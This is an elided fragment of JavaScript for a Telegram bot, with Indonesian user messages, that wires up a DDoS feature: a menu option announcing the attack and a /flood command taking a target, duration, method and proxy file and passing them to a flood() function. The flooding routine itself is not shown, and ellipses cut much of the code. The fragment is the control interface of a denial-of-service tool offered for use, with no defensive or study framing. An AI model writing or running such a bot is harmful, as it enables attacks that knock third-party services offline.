...
bot.on('message', (msg) => {
  ...
  if (text === 'metode 1') {
    ...
    bot.sendMessage(chatId, 'Fitur DDoS dimulai. Harap tentukan parameter target, durasi, dan metode.');
    // Kirim instruksi atau formulir untuk memasukkan informasi lebih lanjut tentang DDoS
  } else {
    showMainMenu(chatId);
  }
});
...
bot.onText(/\/flood (.+)/, (msg, match) => {
  ...
  if (params.length !== 4) {
    bot.sendMessage(chatId, 'Perintah tidak valid. Format: /flood <target> <duration> <method> <proxy_file>');
    return;
  }

  const [target, duration, method, proxyFile] = params;
  ...
  // Jalankan flood
  bot.sendMessage(chatId, `Menjalankan serangan DDoS pada ${target} dengan durasi ${duration} detik menggunakan metode ${method}.`);
  flood.flood(target, durationNum, method, proxyFile);
